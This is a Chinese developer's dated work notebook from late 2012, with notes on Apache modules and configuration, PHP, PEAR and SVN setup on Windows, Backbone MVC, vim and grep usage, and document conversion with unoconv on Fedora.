app.view类，直接增加针对iScroll的公共刷新方法：refreshIScrollHeight()，子类再实现refreshHeight方法。
2012/12/10
iframe的使用要谨慎：
http://www.stevesouders.com/blog/2009/06/03/using-iframes-sparingly/
使页面加载变慢，onload时间往后，占用主页面的连接池，创建的成本大。
一个域名的并发连接数：2，ie6-7，ff2； 4，safari3+，opera9+；6，chrome1+，ie8+，ff3
2012/12/9
mod_header和mod_substitute例子：
<Location /ios/>
    <IfModule headers_module>
        # Header set Content-Type text/html;charset=utf-8 
        Header add X-Content-Type charset=utf-8 
    </IfModule>

    AddOutputFilterByType SUBSTITUTE text/html
    Substitute s/<!--.*-->//
    Substitute "s/\n/ /"
    Substitute "s/[\s\t]{2,}/ /"                                                                                                    
</Location>

Apache 2.2 modules：http://httpd.apache.org/docs/2.2/en/mod/ 
mod_actions
mod_alias
mod_asis
mod_auth_basic
mod_auth_digest
mod_authn_alias
mod_authn_anon
mod_authn_dbd
mod_authn_dbm
mod_authn_default
mod_authn_file
mod_authnz_ldap
mod_authz_dbm
mod_authz_groupfile
mod_authz_host
mod_authz_owner
mod_authz_user
mod_autoindex
mod_cache
mod_cern_meta
mod_cgi
mod_cgid
mod_charset_lite
mod_dav
mod_dav_fs
mod_dav_lock
mod_dbd
mod_deflate
mod_dir
mod_disk_cache
mod_dumpio
mod_echo
mod_env
mod_example
mod_expires
mod_ext_filter
mod_file_cache
mod_filter
mod_headers
mod_ident
mod_imagemap
mod_include
mod_info
mod_isapi
mod_ldap
mod_log_config
mod_log_forensic
modl_logio
mod_mem_cache
mod_mime
mod_mime_magic
mod_negotiation
mod_nw_ssl
mod_proxy
mod_proxy_ajp
mod_proxy_balancer
mod_proxy_connect
mod_proxy_ftp
mod_proxy_http
mod_proxy_scgi
mod_reqtimeout
mod_rewrite
mod_setenvif
mod_so
mod_speling
mod_ssl
mod_status
mod_substitute
mod_suexec
mod_unique_id
mod_userdir
mod_usertrack
mod_version
mod_vhost_alias
mod_sed [Apache 2.4新增]

Windows 下pear的安装：下载go-pear.phar， http://pear.php.net/go-pear.phar ，放到php安装目录下，然后运行 php go-pear.phar
2012/12/7
Windows安装Apache：httpd-2.2.22-win32-x86-openssl-0.9.8t，所有用户80端口，作为一个service，当前用户8080端口，手动启动

安装PHP：下载地址： http://windows.php.net/download/ ， 下载zip包，编译好的二进制文件。Php安装目录下若没有php.ini文件，则默认php.ini文件在c:\windows下。

安装Apache的PHP模块：
#BEGIN PHP INSTALLER EDITS - REMOVE ONLY ON UNINSTALL
PHPIniDir "D:/Program Files/PHP/php"
LoadModule php5_module "D:/Program Files/PHP/php/php5apache2_2.dll"
#END PHP INSTALLER EDITS - REMOVE ONLY ON UNINSTALL

安装Apache的SVN模块：
从svn-win32-1.6.6中复制.so到apache的modules目录，复制.dll到apache的bin目录，冲突不覆盖。
2012/12/5
定期重装系统,win7,制作u盘安装启动盘(UltraISO),装好以后，启用Administrator用户，加域（使用无密码版），安装norton杀毒，以及新版准入（老版升级也可）。
然后，更新驱动，联想官网下载一个联想驱动下载软件，一键安装。
安装Daemon Tools，Office， Google输入法，浏览器等。
安装apache+php+svn环境，安装UnxUtils
安装virtualbox，新版已经带了端口映射，可以从cmd的ipconfig中获取主机ip，再从虚拟机内部通过ifconfig获取子系统ip，然后做端口映射配置
2012/12/4
backbone MVC实践：
父M持有collection，父C负责fetch，以及子C的创建，创建是将属性传递下来，方便子C进行M和V的创建。ios的performance_test为例。

Model可以触发change事件，Collection可以触发reset事件

vim命令，删除某个buffer：
:Nbd    # or
:bd N

backbone.collection.fetch，请求的如果是json数据，那么json数据需要符合json规范，光js能解析还不够，需要使用双引号，key也得双引号括起来，否则会onerror。

NEWS bug：自动调用栏目，不能指定模板循环的最大次数，需要if判断进行控制。见首页国际热搜词调用栏目
2012/12/3
文件名替换shell脚本：
ls | awk '{org = $0; newName = gensub("product", "performance_test", "g", $0);system(sprintf("mv %s %s", org, newName));}'

fedora安装unoconv以及相关的package，须有root权限：
yum install unoconv libreoffice-headless libreoffice-writer*
不装以上package，无法正确使用。

使用方式：
unoconv -l &      # 启动一个server端
unoconv -f txt input.doc

yum list libreoffice*    # 列出相关包的信息，看看还能装哪些包

关于D-Bus：http://en.wikipedia.org/wiki/D-Bus
d-bus使用技巧： http://blog.csdn.net/jack0106/article/details/5588057
libreoffice无法开启d-bus daemon：
dbus-launch    # 启动一个dbus-daemon
DBUS_SESSION_BUS_ADDRESS=unix:abstract=/tmp/dbus-YcjSNNPJHg,guid=18b385acdbd58611ffd3196b4beb69f0  ./A     # 使用指定dbus-daemon运行程序A

fedora命令行下关闭：
init 0
进入命令行模式：
init 3
2012/12/2
unoconv：https://github.com/dagwieers/unoconv/

fedora16安装openoffice：
yum groupinstall "Office/Productivity"
yum -y install openoffice.org-langpack-zh_CN

http://www.lampdeveloper.co.uk/linux/converting-doc-to-pdf-txt-or-html-using-php-and-linux.html
doc转成pdf，txt，html。使用openoffice配合unoconv，在linux平台上使用命令行进行转化。
2012/11/29


chrome管理appcache：
chrome://appcache-internals

echo -n    # 不输出末尾紧跟的换行符
echo -e    # 解析反斜线转义的字符，比如\n，\ooo八进制转义等
echo -E    # 不解析反斜线转义，默认选项

java运行环境配置，linux：3个环境变量需要配置，JAVA_HOME, PATH, CLASSPATH

fis试用环境：
[work@db-news-fe0.vm.baidu.com fis]$ pwd
/home/work/hudamin/fis

fis云安装，以下错误：
0 ===== INSTALL SUCCESS! =====
[INFO] HTTPServer start. listen port[8080]
[INFO] Start PHP-CGI process...Please wait!
Exception in thread "main" java.lang.reflect.InvocationTargetException
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.eclipse.jdt.internal.jarinjarloader.JarRsrcLoader.main(JarRsrcLoader.java:58)
Caused by: java.lang.InternalError: unable to get address of epoll functions, pre-2.6 kernel?

解决方式：
张云龙<E_Virus> 17:47:38
就是我们的那个start.sh
启动服务器的时候有一行代码是：
java -jar FIS-Client.jar
加了一个jvm参数就好了
java -Dxxxxxx -jar FIS-Client.jar，具体如下：
java -Djava.nio.channels.spi.SelectorProvider=sun.nio.ch.PollSelectorProvider -jar client/FIS-Client.jar
2012/11/28
tcpmapping，可通过本地端口映射，使笔记本成为一个站点代理，手机可以通过家庭网络访问到公司服务器的站点。类似apache的proxy rewrite方式。

secureCRT
newsphp开发环境搭建和熟悉
对号入座

grep的-P，支持(?=...)前向断言，但不支持常用的后向断言(?!...)。
grep -I -rP "win(?=[^d][^o][^w])" tangram-1.3.9.js

app下载页的统计，不加延时，丢失率大概为90+%。

vim的前向、后向匹配的用法，与perl正则的区别是，它跟在组合后面，修饰前面的组合，perl是直接包含在组合中，比如(?!...)， ：
/this\()\)\@!      查找this，不包含后面带)的
2012/11/27
vim:
d3l 向右删除3个字符
d3j 向下删除3行，同3dd
d$ 删除到行尾
d^ 删除至行的第一个非空字符
d0 删除之行首

cat -的问题，-有特殊含义，如果文件名就是-，那就悲催了。
linux下对含有空格的文件名的处理有问题，会被分成多个部分。比如Read me first - license.txt
2012/11/26
jquery mobile依赖jquery，从1.7.0以后的版本支持jquery-mobile

jquery mobile：
触屏友好、ajax导航系统、基于标签的行为和主题应用

